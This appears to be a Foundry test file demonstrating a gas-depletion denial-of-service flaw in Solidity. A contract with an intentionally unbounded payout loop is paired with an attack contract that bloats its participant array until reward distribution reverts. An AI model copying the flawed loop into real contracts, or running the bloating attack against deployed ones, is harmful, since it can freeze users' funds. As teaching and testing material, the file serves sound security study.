pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Vulnerable Contract
// SPDX-License-Identifier: UNLICENSED

contract GasDepletionVulnerable {
    address[] public participants;

    // Join the contract by sending exactly 0.01 ETH
    function join() public payable {
        require(msg.value == 0.01 ether, "Invalid value");
        participants.push(msg.sender);
    }

    // Distribute rewards by looping over all participants
    function distributeRewards() public {
        require(participants.length > 0, "No participants");
        uint256 reward = address(this).balance / participants.length;
        for (uint256 i = 0; i < participants.length; i++) {
            payable(participants[i]).transfer(reward);
        }
    }

    // Fallback to receive Ether
    receive() external payable {}
}

// Attack Contract
contract GasDepletionAttack {
    GasDepletionVulnerable public vulnerableContract;

    constructor(address _vulnerableAddress) {
        vulnerableContract = GasDepletionVulnerable(payable(_vulnerableAddress));
    }

    // Attack function: repeatedly call join() to bloat the participants array
    function attack(uint256 times) public payable {
        // Each join requires 0.01 ether
        require(msg.value == times * 0.01 ether, "Invalid total ETH sent");
        for (uint256 i = 0; i < times; i++) {
            vulnerableContract.join{value: 0.01 ether}();
        }
    }
}

// Forge Foundry Test Contract
contract GasDepletionVulnerabilityTest is Test {
    GasDepletionVulnerable vulnerable;
    GasDepletionAttack attack;

    function setUp() public {
        vulnerable = new GasDepletionVulnerable();
        attack = new GasDepletionAttack(address(vulnerable));
    }

    // Test to demonstrate gas depletion vulnerability by using many participants
    function testDistributeRewardsFailsDueToGasDepletion() public {
        // Fund the attack contract with enough ether to join many times
        // total needed = times * 0.01 ether, here times = 300 => 3 ether
        vm.deal(address(attack), 3 ether);
        
        // Attack: fill the participants array with 300 entries
        attack.attack{value: 3 ether}(300);

        // Now, attempt to call distributeRewards with a strict gas limit
        // This should revert because the loop consumes too much gas
        vm.expectRevert();
        vulnerable.distributeRewards{gas: 200000}();
    }

    // Test that distributeRewards works correctly when there are only a few participants
    function testDistributeRewardsWorksForFewParticipants() public {
        // Use two simulated participant addresses
        address participant1 = address(0x1001);
        address participant2 = address(0x1002);

        // Ensure they have sufficient funds to join
        vm.deal(participant1, 1 ether);
        vm.deal(participant2, 1 ether);

        // Participants join the vulnerable contract with exactly 0.01 ETH each
        vm.prank(participant1);
        vulnerable.join{value: 0.01 ether}();
        vm.prank(participant2);
        vulnerable.join{value: 0.01 ether}();

        // Fund the contract additionally via the receive function
        // This makes the total balance: 0.01*2 + 0.1 = 0.12 ETH
        (bool success, ) = address(vulnerable).call{value: 0.1 ether}("");
        require(success, "Funding failed");

        // Record participants' balances before rewards distribution
        uint256 balanceBefore1 = participant1.balance;
        uint256 balanceBefore2 = participant2.balance;

        // Call distributeRewards (with ample gas) so that it completes successfully
        vulnerable.distributeRewards();

        // Expected reward: total balance (0.12 ETH) divided by 2 participants = 0.06 ETH each
        uint256 expectedReward = 0.06 ether;

        uint256 balanceAfter1 = participant1.balance;
        uint256 balanceAfter2 = participant2.balance;

        assertEq(balanceAfter1 - balanceBefore1, expectedReward, "Participant1 reward mismatch");
        assertEq(balanceAfter2 - balanceBefore2, expectedReward, "Participant2 reward mismatch");
    }

    // Allow the test contract to receive ETH
    receive() external payable {}
}
